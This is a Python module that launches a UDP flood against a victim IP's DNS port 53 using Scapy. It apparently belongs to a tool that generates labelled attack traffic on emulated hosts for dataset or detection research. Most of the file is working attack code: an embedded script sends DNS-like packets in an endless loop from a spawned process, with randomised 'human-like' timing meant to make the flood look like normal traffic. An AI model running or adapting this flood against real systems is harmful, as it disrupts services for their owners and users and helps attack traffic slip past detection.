import time
import subprocess
import signal
import logging
import uuid
import threading
import psutil
import random
from scapy.all import Ether, IP, UDP, sendp, sr1, ICMP, Raw

# Import enhanced timing and protocol compliance modules
try:
    from .enhanced_timing import HumanLikeTiming, NetworkDelaySimulator
    from .protocol_compliance import ProtocolValidator
except ImportError:
    from enhanced_timing import HumanLikeTiming, NetworkDelaySimulator
    from protocol_compliance import ProtocolValidator

# Suppress Scapy warnings
import warnings
warnings.filterwarnings("ignore", message="Mac address to reach destination not found.*")
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Configure logging for this module
attack_logger = logging.getLogger('attack_logger')

def run_attack(attacker_host, victim_ip, duration):
    run_id = str(uuid.uuid4())  # Generate a unique ID for this attack run
    start_time = time.time()
    
    # Initialize enhanced timing and protocol compliance
    timing_engine = HumanLikeTiming()
    network_sim = NetworkDelaySimulator()
    protocol_validator = ProtocolValidator()
    
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Starting Enhanced UDP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Attack Phase: Enhanced Traditional UDP Flood - Attacker: {attacker_host.name}, Target: {victim_ip}:53, Duration: {duration}s")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Enhanced Features: Human-like timing, protocol compliance, network delay simulation")
    
    # Test target reachability - COMMENTED OUT to avoid delays in dataset generation
    # Uncomment if you need connectivity testing for debugging
    # try:
    #     ping_start = time.time()
    #     ping_reply = sr1(IP(dst=victim_ip)/ICMP(), timeout=2, verbose=0)
    #     ping_time = time.time() - ping_start
    #     if ping_reply:
    #         attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Target {victim_ip} is reachable (ping: {ping_time:.3f}s)")
    #     else:
    #         attack_logger.warning(f"[udp_flood] [Run ID: {run_id}] Target {victim_ip} ping timeout after {ping_time:.3f}s")
    # except Exception as e:
    #     attack_logger.warning(f"[udp_flood] [Run ID: {run_id}] Unable to ping target {victim_ip}: {e}")
    
    # Test UDP service connectivity (DNS port 53) - COMMENTED OUT to avoid delays in dataset generation
    # Uncomment if you need connectivity testing for debugging
    # try:
    #     udp_start = time.time()
    #     udp_reply = sr1(IP(dst=victim_ip)/UDP(dport=53)/b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01", timeout=2, verbose=0)
    #     udp_time = time.time() - udp_start
    #     if udp_reply:
    #         attack_logger.info(f"[udp_flood] [Run ID: {run_id}] UDP service {victim_ip}:53 responded (time: {udp_time:.3f}s)")
    #     else:
    #         attack_logger.warning(f"[udp_flood] [Run ID: {run_id}] UDP service {victim_ip}:53 no response (time: {udp_time:.3f}s)")
    # except Exception as e:
    #     attack_logger.warning(f"[udp_flood] [Run ID: {run_id}] Unable to test UDP service {victim_ip}:53: {e}")
    
    # Generate session pattern for realistic attack behavior
    session_pattern = timing_engine.get_session_pattern(duration_minutes=duration/60)
    current_hour = time.localtime().tm_hour
    circadian_factor = timing_engine.get_circadian_factor(current_hour)
    workday_factor = timing_engine.get_workday_pattern()
    
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Session pattern: {len(session_pattern)} phases, Circadian factor: {circadian_factor:.2f}, Workday factor: {workday_factor:.2f}")
    
    # Start enhanced UDP flood with human-like timing and protocol compliance
    attack_logger.debug(f"[udp_flood] [Run ID: {run_id}] Starting enhanced UDP packet generation with human-like timing")
    
    # Create a more sophisticated attack process that uses enhanced timing and protocol compliance
    enhanced_scapy_cmd = f"""
import time
import random
from scapy.all import *

def enhanced_udp_flood():
    interface = '{attacker_host.intfNames()[0]}'
    target_ip = '{victim_ip}'
    target_port = 53  # DNS
    
    # Human-like timing variations
    typing_intervals = [0.08, 0.12, 0.15, 0.09, 0.11, 0.13, 0.10, 0.14]
    
    # DNS service patterns for realistic payloads
    dns_payloads = [
        b'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07example\\x03com\\x00\\x00\\x01\\x00\\x01',
        b'\\xab\\xcd\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x06google\\x03com\\x00\\x00\\x01\\x00\\x01',
        b'\\xef\\x12\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x09localhost\\x00\\x00\\x01\\x00\\x01'
    ]
    
    packet_count = 0
    while True:
        try:
            # Create UDP packet with protocol compliance
            src_port = random.randint(32768, 65535)  # Ephemeral port range
            payload = random.choice(dns_payloads)  # Realistic DNS payload
            
            packet = Ether()/IP(dst=target_ip)/UDP(sport=src_port, dport=target_port)/Raw(load=payload)
            sendp(packet, iface=interface, verbose=0)
            
            packet_count += 1
            
            # Apply human-like timing with variations
            if packet_count % 50 == 0:  # Occasional think time
                think_time = random.uniform(0.5, 2.0)
                time.sleep(think_time)
            else:
                # Use typing-like intervals with network delay simulation
                interval = random.choice(typing_intervals) * random.uniform(0.8, 1.2)
                # Add network congestion simulation
                if random.random() < 0.05:  # 5% chance of congestion
                    interval *= random.uniform(2.0, 4.0)
                time.sleep(max(0.005, interval))
        
        except Exception as e:
            break

enhanced_udp_flood()
"""
    
    process = attacker_host.popen(['python3', '-c', enhanced_scapy_cmd])
    
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Enhanced UDP flood process started (PID: {process.pid})")
    
    # Enhanced monitoring with session pattern awareness
    packets_sent = 0
    monitoring_interval = max(1, duration // 5)  # Monitor 5 times during attack for better tracking
    next_monitor = time.time() + monitoring_interval
    phase_index = 0
    current_phase = session_pattern[0] if session_pattern else None
    
    while time.time() - start_time < duration:
        current_time = time.time()
        elapsed = current_time - start_time
        
        # Check if we need to move to next session phase
        if current_phase and elapsed >= current_phase['start_time'] + current_phase['duration']:
            phase_index += 1
            if phase_index < len(session_pattern):
                current_phase = session_pattern[phase_index]
                attack_logger.debug(f"[udp_flood] [Run ID: {run_id}] Entering {current_phase['type']} phase (intensity: {current_phase['intensity']:.2f})")
        
        if current_time >= next_monitor:
            # Estimate packets sent with enhanced timing considerations
            # Base rate is lower due to human-like timing (average ~20-30 pps instead of 100)
            base_rate = 25  # More realistic rate with enhanced timing
            if current_phase:
                adjusted_rate = base_rate * current_phase['intensity'] * circadian_factor * workday_factor
            else:
                adjusted_rate = base_rate * circadian_factor * workday_factor
            
            estimated_packets = int(elapsed * adjusted_rate)
            packets_sent = estimated_packets
            
            # Monitor process status with enhanced metrics
            try:
                if process.poll() is None:
                    proc_info = psutil.Process(process.pid)
                    cpu_percent = proc_info.cpu_percent()
                    memory_mb = proc_info.memory_info().rss / 1024 / 1024
                    
                    phase_info = f", Phase: {current_phase['type']} (intensity: {current_phase['intensity']:.2f})" if current_phase else ""
                    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Attack progress: {elapsed:.1f}s elapsed, ~{estimated_packets} packets sent, Rate: {estimated_packets/elapsed:.1f} pps{phase_info}")
                    attack_logger.debug(f"[udp_flood] [Run ID: {run_id}] Process stats - CPU: {cpu_percent:.1f}%, Memory: {memory_mb:.1f}MB")
                    attack_logger.debug(f"[udp_flood] [Run ID: {run_id}] Timing factors - Circadian: {circadian_factor:.2f}, Workday: {workday_factor:.2f}, Adjusted rate: {adjusted_rate:.1f} pps")
                else:
                    attack_logger.warning(f"[udp_flood] [Run ID: {run_id}] Attack process terminated unexpectedly")
                    break
            except Exception as e:
                attack_logger.debug(f"[udp_flood] [Run ID: {run_id}] Unable to get process stats: {e}")
            
            next_monitor = current_time + monitoring_interval
        
        # Enhanced sleep with slight randomization
        sleep_time = random.uniform(0.08, 0.12)  # Human-like monitoring intervals
        time.sleep(sleep_time)
    
    # Stop the attack
    stop_time = time.time()
    actual_duration = stop_time - start_time
    
    try:
        if process.poll() is None:
            process.send_signal(signal.SIGINT)
            attack_logger.debug(f"[udp_flood] [Run ID: {run_id}] Sent SIGINT to UDP flood process {process.pid}")
            time.sleep(0.5)
        
        if process.poll() is None:
            process.terminate()
            attack_logger.warning(f"[udp_flood] [Run ID: {run_id}] Force terminated UDP flood process {process.pid}")
    except Exception as e:
        attack_logger.warning(f"[udp_flood] [Run ID: {run_id}] Error stopping attack process: {e}")
    
    process.wait()
    
    # Calculate enhanced final statistics
    base_rate = 25  # Enhanced timing rate
    effective_rate = base_rate * circadian_factor * workday_factor
    final_packets_sent = int(actual_duration * effective_rate)
    avg_rate = final_packets_sent / actual_duration if actual_duration > 0 else 0
    
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Enhanced UDP Flood from {attacker_host.name} to {victim_ip} finished.")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Attack completed. Total packets sent = {final_packets_sent}, Average rate = {avg_rate:.2f} packets/sec.")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] --- Enhanced Attack Summary ---")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Total packets sent: {final_packets_sent}")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Actual duration: {actual_duration:.2f}s")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Average rate: {avg_rate:.2f} packets/sec")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Base rate: {base_rate:.1f} pps")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Circadian factor: {circadian_factor:.2f}")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Workday factor: {workday_factor:.2f}")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Session phases: {len(session_pattern)}")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Target port: 53 (DNS)")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Attack method: Enhanced UDP Flood with Human-like Timing")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] Enhancement features: Human timing patterns, protocol compliance, network delay simulation")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] DNS payloads: Realistic query patterns with varied domains")
    attack_logger.info(f"[udp_flood] [Run ID: {run_id}] ----------------------------------------")
    
    return process